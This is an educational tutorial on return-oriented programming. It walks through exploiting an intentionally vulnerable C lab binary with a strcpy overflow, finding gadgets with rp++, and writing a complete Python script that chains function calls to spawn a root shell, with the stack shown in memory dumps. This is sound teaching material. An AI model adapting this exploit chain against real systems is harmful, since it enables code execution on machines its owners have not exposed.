# Return-Oriented Programming (ROP)

Return-Oriented Programming or ROP for short combines a large number of short instruction sequences to build *gadgets* that  allow arbitrary computation. From [3]:

> Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR) and NX/DEP. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution.

----

**Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
```bash
docker build -t basic_cybersecurity5:latest .
```
and runned with:
```bash
docker run --privileged -it basic_cybersecurity5:latest
```

----

The content used for this tutorial will be heavily relying on [3]. The tutorial's objective is to learn about the basic concept of return-oriented programming (ROP).

From [9]:

> ##### NX/DEP
>DEP stands for data execution prevention, this technique marks areas of memory as non executable. Usually the stack and heap are marked as non executable thus preventing attacker from executing code residing in these regions of memory.

> ##### ASLR
>ASLR stands for Address Space Layer Randomization. This technique randomizes address of memory where shared libraries , stack and heap are maapped at. This prevent attacker from predicting where to take EIP , since attacker does not knows address of his malicious payload.

> ##### Stack Canaries
>In this technique compiler places a randomized guard value after stack frame’s local variables and before the saved return address. This guard is checked before function returns if it’s not same then program exits.


From `ret-to-libc` to ROP

From [3],
> With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code6 rather than just calling functions we have available to us. We do this by returning to gadgets, which are short sequences of instructions ending in a ret.
>
> We can also use ROP to chain function calls: rather than a dummy return address, we use a pop; ret gadget to move the stack above the arguments to the first function. Since we are just using the pop; ret gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary

```C
char string[100];

void exec_string() {
    system(string);
}

void add_bin(int magic) {
    if (magic == 0xdeadbeef) {
        strcat(string, "/bin");
    }
}

void add_sh(int magic1, int magic2) {
    if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
        strcat(string, "/sh");
    }
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    string[0] = 0;
    vulnerable_function(argv[1]);
    return 0;
}
```

We can see that the goal is to call `add_bin`, then `add_sh`, then `exec_string`. When we call add_bin, the stack must look like:

```
high | <argument>       |
low  | <return address> |
```

In our case, we want the argument to be `0xdeadbeef` we want the return address to be a pop; ret gadget. This will remove `0xdeadbeef` from the stack and return to the next gadget on the stack. We thus have a gadget to call `add_bin(0xdeadbeef)` that looks like:
```
high  | 0xdeadbeef            |
      | <address of pop; ret> |
      | <address of add_bin>  |
```
(*this is a gadget*)

Since `add_sh(0xcafebabe, 0x0badf00d)` use two arguments, we need a `pop; pop; ret`:
```
high  | 0x0badf00d                 |
      | 0xcafebabe                 |
      | <address of pop; pop; ret> |
      | <address of add_sh>        |
```
(*note how gadgets get chained with those ones executing first in the lowest memory addresses (closer to the stack pointer)*)

Putting all of it together:

```
high    | <address of exec_string>     |
        | 0x0badf00d                   |
        | 0xcafebabe                   |
        | <address of pop; pop; ret>   |
        | <address of add_sh>          |
        | 0xdeadbeef                   |
        | <address of pop; ret>        |
        | <address of add_bin>         |
        | 0x42424242 (fake saved %ebp) |
        | 0x41414141 ...               |
        |   ... (0x6c bytes of 'A's)   |
        |   ... 0x41414141             |
```

With this diagram in mind, let's figure out the addresses. First the functions:
```
>>> p &exec_string
$1 = (void (*)()) 0x804844d <exec_string>
>>> p &add_bin
$2 = (void (*)(int)) 0x8048461 <add_bin>
>>> p &add_sh
$3 = (void (*)(int, int)) 0x804849c <add_sh>
```
To obtain the gadgets and identify the right one. To do so we could use `dumprop` from PEDA [11], or `rp++` [12]:
```
A total of 162 gadgets found.
0x0804870b: adc al, 0x41 ; ret  ;  (1 found)
0x08048497: add al, 0x00 ; pop edi ; pop ebp ; ret  ;  (1 found)
0x0804830a: add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
0x08048418: add al, 0x08 ; add ecx, ecx ; rep ret  ;  (1 found)
0x080483b4: add al, 0x08 ; call eax ;  (1 found)
0x0804843d: add al, 0x08 ; call eax ;  (1 found)
0x080483f1: add al, 0x08 ; call edx ;  (1 found)
0x08048304: add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
0x080483b0: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call eax ;  (1 found)
0x080483ed: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call edx ;  (1 found)
0x08048302: add al, 0xA0 ; add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
0x080482ff: add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
0x080482fd: add byte [eax], al ; add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
0x0804830c: add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
0x0804851a: add byte [eax], al ; add byte [eax], al ; leave  ; ret  ;  (1 found)
...
```
In particular we filter by `pop`:
```bash
root@74929f891a04:~# ./rp++ -f rop6 -r 3 | grep pop
0x08048497: add al, 0x00 ; pop edi ; pop ebp ; ret  ;  (1 found)
0x080482f0: add byte [eax], al ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
0x080485a1: add byte [eax], al ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
0x0804859d: add ebx, 0x00001A63 ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
0x080482f2: add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
0x080485a3: add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
0x08048578: fild word [ebx+0x5E5B1CC4] ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048493: imul ebp, dword [esi-0x3A], 0x5F000440 ; pop ebp ; ret  ;  (1 found)
0x080482f3: les ecx,  [eax] ; pop ebx ; ret  ;  (1 found)
0x080485a4: les ecx,  [eax] ; pop ebx ; ret  ;  (1 found)
0x08048495: mov byte [eax+0x04], 0x00000000 ; pop edi ; pop ebp ; ret  ;  (1 found)
0x080484d3: mov dword [eax], 0x0068732F ; pop edi ; pop ebp ; ret  ;  (1 found)
0x0804849a: pop ebp ; ret  ;  (1 found)
0x080484da: pop ebp ; ret  ;  (1 found)
0x0804857f: pop ebp ; ret  ;  (1 found)
0x080482f5: pop ebx ; ret  ;  (1 found)
0x080485a6: pop ebx ; ret  ;  (1 found)
0x08048499: pop edi ; pop ebp ; ret  ;  (1 found)
0x080484d9: pop edi ; pop ebp ; ret  ;  (1 found)
0x0804857e: pop edi ; pop ebp ; ret  ;  (1 found)
0x0804857d: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
```
From the content above, we pick `0x080485a6` (pop; ret) and `0x08048499` (pop; pop; ret).

Alternative, using `objdump -d rop6`, we can find most of this information visually.

With all this information, we go ahead and build a script that puts it all together:
```Python
#!/usr/bin/python

import os
import struct

# These values were found with `objdump -d a.out`.
pop_ret = 0x080485a6
pop_pop_ret = 0x08048499
exec_string = 0x804844d
add_bin = 0x8048461
add_sh = 0x804849c

# First, the buffer overflow.
payload =  "A"*0x6c
payload += "BBBB"

# The add_bin(0xdeadbeef) gadget.
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

# The add_sh(0xcafebabe, 0x0badf00d) gadget.
payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0xbadf00d)

# Our final destination.
payload += struct.pack("I", exec_string)

print(payload)

os.system("./rop6 \"%s\"" % payload)
```

Executing this:
```bash
root@5daa0de3a6d9:~# python rop6_exploit.py
?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBa?ﾭޜ?????
 M?
# ls
checksec.sh  rop1    rop1_noprotection	rop2.c		   rop3    rop4    rop5    rop6    rop6_exploit.py
peda	     rop1.c  rop2		rop2_noprotection  rop3.c  rop4.c  rop5.c  rop6.c  rp++
# uname -a
Linux 5daa0de3a6d9 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Let's analyze the memory in more detail to understand the script's behavior:
```
─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            esp
0xffffd6d0 [ec d6 ff ff] 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
                                    ebp           ret
0xffffd750 41 41 41 41 41 41 41 41 [42 42 42 42] [61 84 04 08] AAAAAAAABBBBa...
0xffffd760 a6 85 04 08 ef be ad de 9c 84 04 08 99 84 04 08 ................
0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
```
Originally and after copying the argument (generated from the python script) to the stack,
the *base pointer* `ebp` has the value `0x42424242` (or "BBBB") which will lead to a segmentation error
when the stack returns. Note that we've rewritten the return address with the address of `add_bin`, thereby, after we reach the `ret` instruction we'll head there.

The first few instructions of function `add_bin` are as follows:
```
0x08048461 add_bin+0 push   %ebp
0x08048462 add_bin+1 mov    %esp,%ebp
0x08048464 add_bin+3 push   %edi
0x08048465 add_bin+4 cmpl   $0xdeadbeef,0x8(%ebp)
```
Leaving the stack as:
```
─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
                                    esp           ebp
0xffffd750 41 41 41 41 41 41 41 41 [00 00 00 00] [42 42 42 42] AAAAAAAA....BBBB
            ret              magic
0xffffd760 [a6 85 04 08 ef] [be ad de 9c] 84 04 08 99 84 04 08 ................
0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
```
note that the registers `ebp` and `edi` have been pushed to the stack having the stack pointer `esp` at `0xffffd758`. Moreover, the return address of this function will be `0x080485a6` (ret) and `magic` is taken directly from the stack. After `add_bin` executes, the function returns to `0x080485a6` which we previously engineer to point to the following instructions:
```
0x080485a6 _fini+18 pop    %ebx
0x080485a7 _fini+19 ret    
```
with a stack that looks like what follows:
```
─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
                        esp
0xffffd760 a6 85 04 08 [ef be ad de] 9c 84 04 08 99 84 04 08 ................
0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
```
After executing the first instruction (`0x080485a6 _fini+18 pop    %ebx`), the stack looks like:
```
─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xffffd750 41 41 41 41 41 41 41 41 00 00 00 00 42 42 42 42 AAAAAAAA....BBBB
                                    esp
0xffffd760 a6 85 04 08 ef be ad de [9c 84 04 08] 99 84 04 08 ................
0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
```
 The stack pointer `esp` now points to the address of `add_sh`. With this setup, the next instruction (`0x080485a7 _fini+19 ret`) will in fact make the instruction pointer `eip` point to the address of `add_sh`. The flow of the stack continues similarly, with return addresses pointing to sections in the code that "adjust the stack offset" so that the flow goes as desired.

 ### Bibliography

 - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
 - [2] Hovav Shacham (2007), *The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)*. In Proceedings of the 14th ACM conference on Computer and communications security (CCS '07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313
 - [3] Alex Reece (2013). *Introduction to return oriented programming (ROP)*. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.
 - [4] Georgia Tech (2016). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/cal.html
 - [5] Georgia Tech (2017). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2017/cal.html
 - [6] Georgia Tech (2017). *CS 6265: Information Security Lab. Lec07: Return-oriented Programming*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt
 - [7] Standford. *64-bit Linux Return-Oriented Programming*. Retrieved from https://crypto.stanford.edu/~blynn/rop/
 - [8] slimm609. *checksec.sh*. Retrieved from https://github.com/slimm609/checksec.sh
 - [9] Ketan Singh (2017), *Introduction to Return Oriented Programming (ROP)*. Retreived from https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/.
 - [10] Stack Overflow. *Managing inputs for payload injection?*. Retrieved from https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa.
 - [11] Long Le. *Python Exploit Development Assistance for GDB (PEDA)*. Retreived from https://github.com/longld/peda.
 - [12] Axel Souchet. *rp++*. Retrieved from https://github.com/0vercl0k/rp.
